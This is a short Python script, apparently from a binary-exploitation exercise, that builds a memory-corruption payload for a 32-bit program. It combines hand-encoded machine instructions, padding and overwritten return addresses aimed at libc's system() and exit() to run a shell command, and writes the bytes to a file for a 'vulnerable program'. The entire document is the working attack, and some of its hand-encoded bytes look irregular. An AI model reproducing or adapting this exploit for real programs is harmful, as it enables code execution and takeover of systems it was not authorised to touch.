import struct

# Assume these values are found through your analysis
buffer_size = 20
buffer_followup_offset = 9
libc_base_addr = 0xb7e2c000
exit_offset = 0x32be0
system_offset = 0x0003f060 
bin_sh_offset = 0x160c58
str_addr = 0xbfffff58
shellcode_address = 0xbffff5f7

# Create the payload
payload = b"\xaa\xC7\x04\x24"  # mov_dword
payload += struct.pack("<I", str_addr)
payload += b"\xe8"          # call
payload += struct.pack("<i", libc_base_addr + system_offset - (shellcode_address + 12)) # current address for relative call
payload += b"a" * 7
payload += b"\x0a"
payload += b"\x00" * (0x1000 - 21)
payload += b"a" * 5
payload += struct.pack("<I", shellcode_address)
payload += struct.pack("<I", shellcode_address)
payload += struct.pack("<I", libc_base_addr + exit_offset)
payload += b"a" * 3
payload += b"\x0a\x00"


# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
